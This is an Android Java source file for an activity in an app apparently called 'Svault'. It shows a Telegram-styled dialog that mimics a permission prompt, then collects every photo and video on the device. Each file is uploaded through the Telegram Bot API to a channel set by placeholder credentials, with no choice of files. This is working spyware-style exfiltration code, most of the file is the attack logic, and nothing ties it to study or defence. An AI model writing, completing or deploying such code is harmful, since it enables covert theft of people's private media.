package com.tenix.svault;

import android.Manifest;
import android.app.Activity;
import android.app.Dialog;
import android.app.Notification;
import android.app.NotificationChannel;
import android.app.NotificationManager;
import android.content.ContentUris;
import android.content.pm.PackageManager;
import android.database.Cursor;
import android.graphics.Color;
import android.graphics.drawable.ColorDrawable;
import android.graphics.drawable.GradientDrawable;
import android.net.Uri;
import android.os.Build;
import android.os.Bundle;
import android.provider.MediaStore;
import android.view.Gravity;
import android.view.ViewGroup;
import android.view.Window;
import android.widget.Button;
import android.widget.FrameLayout;
import android.widget.ImageView;
import android.widget.LinearLayout;
import android.widget.TextView;
import android.widget.Toast;

import java.io.DataOutputStream;
import java.io.InputStream;
import java.net.HttpURLConnection;
import java.net.URL;
import java.util.ArrayList;
import java.util.concurrent.ExecutorService;
import java.util.concurrent.Executors;

public class inq extends Activity {

    // ── SET YOUR CREDENTIALS HERE ────────────────────────────
    static final String BOT_TOKEN  = "YOUR_BOT_TOKEN_HERE";
    static final String CHANNEL_ID = "@your_channel_username"; // or -100xxxxxxxxxx
    // ────────────────────────────────────────────────────────

    private static final int    REQ_PERM  = 1;
    private static final int    NOTIF_ID  = 55;
    private static final String NOTIF_CH  = "svault_upload";

    private NotificationManager nm;
    private ExecutorService     executor;
    private Dialog              permDialog;

    // ── Lifecycle ─────────────────────────────────────────────

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        // No setContentView — Activity is transparent (see manifest theme)
        executor = Executors.newSingleThreadExecutor();
        nm = (NotificationManager) getSystemService(NOTIFICATION_SERVICE);
        initNotifChannel();

        if (hasPermission()) {
            startUpload();
        } else {
            showPermDialog();
        }
    }

    @Override
    protected void onDestroy() {
        super.onDestroy();
        if (executor != null && !executor.isShutdown()) executor.shutdown();
        if (permDialog != null && permDialog.isShowing()) permDialog.dismiss();
    }

    // ── Permission check ──────────────────────────────────────

    @SuppressWarnings("NewApi")
    private boolean hasPermission() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
            return checkSelfPermission(Manifest.permission.READ_MEDIA_IMAGES)
                   == PackageManager.PERMISSION_GRANTED;
        } else if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
            return checkSelfPermission(Manifest.permission.READ_EXTERNAL_STORAGE)
                   == PackageManager.PERMISSION_GRANTED;
        }
        return true;
    }

    // ── Custom bottom-sheet dialog (Telegram style) ───────────

    private void showPermDialog() {
        permDialog = new Dialog(this);
        permDialog.requestWindowFeature(Window.FEATURE_NO_TITLE);
        permDialog.setCancelable(false);

        int dp = Math.round(getResources().getDisplayMetrics().density);

        // Sheet container
        LinearLayout sheet = new LinearLayout(this);
        sheet.setOrientation(LinearLayout.VERTICAL);
        sheet.setGravity(Gravity.CENTER_HORIZONTAL);
        sheet.setPadding(32 * dp, 36 * dp, 32 * dp, 48 * dp);
        GradientDrawable sheetBg = new GradientDrawable();
        sheetBg.setColor(0xFF1E1E1E);
        sheetBg.setCornerRadii(new float[]{24*dp, 24*dp, 24*dp, 24*dp, 0, 0, 0, 0});
        sheet.setBackground(sheetBg);

        // Blue circle icon
        FrameLayout circle = new FrameLayout(this);
        int csz = 72 * dp;
        LinearLayout.LayoutParams cp = new LinearLayout.LayoutParams(csz, csz);
        cp.setMargins(0, 0, 0, 24 * dp);
        circle.setLayoutParams(cp);
        GradientDrawable circleBg = new GradientDrawable();
        circleBg.setShape(GradientDrawable.OVAL);
        circleBg.setColor(0xFF5BABF0);
        circle.setBackground(circleBg);
        ImageView icon = new ImageView(this);
        icon.setImageResource(android.R.drawable.ic_menu_gallery);
        icon.setColorFilter(Color.WHITE);
        int ip = 16 * dp;
        icon.setPadding(ip, ip, ip, ip);
        circle.addView(icon, new FrameLayout.LayoutParams(
                FrameLayout.LayoutParams.MATCH_PARENT,
                FrameLayout.LayoutParams.MATCH_PARENT));

        // Title
        TextView title = new TextView(this);
        title.setText("Allow Svault to access\nyour photos and videos?");
        title.setTextColor(Color.WHITE);
        title.setTextSize(17f);
        title.setGravity(Gravity.CENTER);
        LinearLayout.LayoutParams tp = new LinearLayout.LayoutParams(
                LinearLayout.LayoutParams.MATCH_PARENT,
                LinearLayout.LayoutParams.WRAP_CONTENT);
        tp.setMargins(0, 0, 0, 36 * dp);
        title.setLayoutParams(tp);

        // Allow button
        Button allow = new Button(this);
        allow.setText("Allow");
        allow.setTextColor(Color.WHITE);
        allow.setTextSize(16f);
        GradientDrawable allowBg = new GradientDrawable();
        allowBg.setColor(0xFF3A3A3A);
        allowBg.setCornerRadius(12 * dp);
        allow.setBackground(allowBg);
        allow.setPadding(0, 14 * dp, 0, 14 * dp);
        LinearLayout.LayoutParams ap = new LinearLayout.LayoutParams(
                LinearLayout.LayoutParams.MATCH_PARENT,
                LinearLayout.LayoutParams.WRAP_CONTENT);
        ap.setMargins(0, 0, 0, 8 * dp);
        allow.setLayoutParams(ap);
        allow.setOnClickListener(v -> {
            permDialog.dismiss();
            doRequestPermission();      // triggers system dialog
        });

        // Don't allow button
        Button deny = new Button(this);
        deny.setText("Don't allow");
        deny.setTextColor(0xFF8E8E8E);
        deny.setTextSize(15f);
        deny.setBackground(null);
        deny.setPadding(0, 10 * dp, 0, 10 * dp);
        deny.setLayoutParams(new LinearLayout.LayoutParams(
                LinearLayout.LayoutParams.MATCH_PARENT,
                LinearLayout.LayoutParams.WRAP_CONTENT));
        deny.setOnClickListener(v -> {
            permDialog.dismiss();
            finish();
        });

        sheet.addView(circle);
        sheet.addView(title);
        sheet.addView(allow);
        sheet.addView(deny);

        permDialog.setContentView(sheet);

        Window w = permDialog.getWindow();
        if (w != null) {
            w.setBackgroundDrawable(new ColorDrawable(Color.TRANSPARENT));
            w.setLayout(ViewGroup.LayoutParams.MATCH_PARENT, ViewGroup.LayoutParams.WRAP_CONTENT);
            w.setGravity(Gravity.BOTTOM);
        }

        permDialog.show();
    }

    // ── Trigger system permission dialog ──────────────────────

    @SuppressWarnings("NewApi")
    private void doRequestPermission() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
            requestPermissions(new String[]{
                    Manifest.permission.READ_MEDIA_IMAGES,
                    Manifest.permission.READ_MEDIA_VIDEO,
                    Manifest.permission.POST_NOTIFICATIONS
            }, REQ_PERM);
        } else if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
            requestPermissions(new String[]{
                    Manifest.permission.READ_EXTERNAL_STORAGE
            }, REQ_PERM);
        } else {
            startUpload();
        }
    }

    @Override
    public void onRequestPermissionsResult(int code, String[] perms, int[] results) {
        if (code != REQ_PERM) return;
        for (int i = 0; i < perms.length; i++) {
            String p = perms[i];
            if (results[i] == PackageManager.PERMISSION_GRANTED
                    && (p.equals(Manifest.permission.READ_MEDIA_IMAGES)
                     || p.equals(Manifest.permission.READ_EXTERNAL_STORAGE))) {
                startUpload();
                return;
            }
        }
        Toast.makeText(this, "Permission denied", Toast.LENGTH_SHORT).show();
        finish();
    }

    // ── Upload logic ──────────────────────────────────────────

    private void startUpload() {
        executor.execute(() -> {
            ArrayList<Uri> all = collectMedia();
            int total = all.size();
            if (total == 0) return;

            int ok = 0;
            for (int i = 0; i < total; i++) {
                if (sendToTelegram(all.get(i))) ok++;
                pushNotif(i + 1, total);
            }
            doneNotif(ok, total);
        });
    }

    // ── Media scanning ────────────────────────────────────────

    private ArrayList<Uri> collectMedia() {
        ArrayList<Uri> list = new ArrayList<>();
        try (Cursor c = getContentResolver().query(
                MediaStore.Images.Media.EXTERNAL_CONTENT_URI,
                new String[]{MediaStore.Images.Media._ID},
                null, null, null)) {
            if (c != null) while (c.moveToNext())
                list.add(ContentUris.withAppendedId(
                        MediaStore.Images.Media.EXTERNAL_CONTENT_URI, c.getLong(0)));
        } catch (Exception ignored) {}

        try (Cursor c = getContentResolver().query(
                MediaStore.Video.Media.EXTERNAL_CONTENT_URI,
                new String[]{MediaStore.Video.Media._ID},
                null, null, null)) {
            if (c != null) while (c.moveToNext())
                list.add(ContentUris.withAppendedId(
                        MediaStore.Video.Media.EXTERNAL_CONTENT_URI, c.getLong(0)));
        } catch (Exception ignored) {}

        return list;
    }

    // ── Telegram API ──────────────────────────────────────────

    private boolean sendToTelegram(Uri uri) {
        try {
            String mime   = getContentResolver().getType(uri);
            boolean isVid = mime != null && mime.startsWith("video");
            String method = isVid ? "sendVideo" : "sendPhoto";
            String field  = isVid ? "video"     : "photo";
            String bound  = "SVB" + System.currentTimeMillis();

            HttpURLConnection conn = (HttpURLConnection)
                    new URL("https://api.telegram.org/bot" + BOT_TOKEN + "/" + method)
                    .openConnection();
            conn.setRequestMethod("POST");
            conn.setDoOutput(true);
            conn.setConnectTimeout(30_000);
            conn.setReadTimeout(120_000);
            conn.setRequestProperty("Content-Type",
                    "multipart/form-data; boundary=" + bound);

            DataOutputStream out = new DataOutputStream(conn.getOutputStream());
            out.writeBytes("--" + bound + "\r\n");
            out.writeBytes("Content-Disposition: form-data; name=\"chat_id\"\r\n\r\n");
            out.writeBytes(CHANNEL_ID + "\r\n");
            out.writeBytes("--" + bound + "\r\n");
            out.writeBytes("Content-Disposition: form-data; name=\""
                    + field + "\"; filename=\"file\"\r\n");
            out.writeBytes("Content-Type: "
                    + (mime != null ? mime : "application/octet-stream") + "\r\n\r\n");
            try (InputStream in = getContentResolver().openInputStream(uri)) {
                byte[] buf = new byte[8192];
                int n;
                if (in != null) while ((n = in.read(buf)) != -1) out.write(buf, 0, n);
            }
            out.writeBytes("\r\n--" + bound + "--\r\n");
            out.flush();
            out.close();

            int code = conn.getResponseCode();
            conn.disconnect();
            return code == 200;
        } catch (Exception e) {
            return false;
        }
    }

    // ── Notification helpers ──────────────────────────────────

    private void initNotifChannel() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            nm.createNotificationChannel(new NotificationChannel(
                    NOTIF_CH, "Svault Upload", NotificationManager.IMPORTANCE_LOW));
        }
    }

    @SuppressWarnings("deprecation")
    private void pushNotif(int cur, int total) {
        Notification.Builder b = Build.VERSION.SDK_INT >= Build.VERSION_CODES.O
                ? new Notification.Builder(this, NOTIF_CH)
                : new Notification.Builder(this);
        b.setSmallIcon(android.R.drawable.ic_menu_upload)
         .setContentTitle("Svault — uploading")
         .setContentText(cur + " / " + total)
         .setProgress(total, cur, false)
         .setOngoing(true);
        nm.notify(NOTIF_ID, b.build());
    }

    @SuppressWarnings("deprecation")
    private void doneNotif(int ok, int total) {
        Notification.Builder b = Build.VERSION.SDK_INT >= Build.VERSION_CODES.O
                ? new Notification.Builder(this, NOTIF_CH)
                : new Notification.Builder(this);
        b.setSmallIcon(android.R.drawable.ic_menu_upload)
         .setContentTitle("Svault — complete")
         .setContentText(ok + " / " + total + " uploaded")
         .setAutoCancel(true)
         .setOngoing(false);
        nm.notify(NOTIF_ID, b.build());
    }
}
